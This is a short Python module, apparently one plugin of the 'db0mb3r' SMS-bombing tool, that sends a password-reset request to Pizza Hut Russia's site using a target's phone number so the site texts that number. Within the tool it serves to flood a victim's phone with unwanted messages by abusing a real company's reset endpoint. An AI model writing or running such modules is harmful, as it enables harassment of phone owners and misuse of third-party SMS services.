from db0mb3r.services.service import Service

class Pizzahut(Service):

    async def run(self):
        await self.post(
            "https://pizzahut.ru/account/password-reset",
            data={"reset_by": "phone", "action_id": "pass-recovery", "phone": self.formatted_phone, "_token": "*"},
        )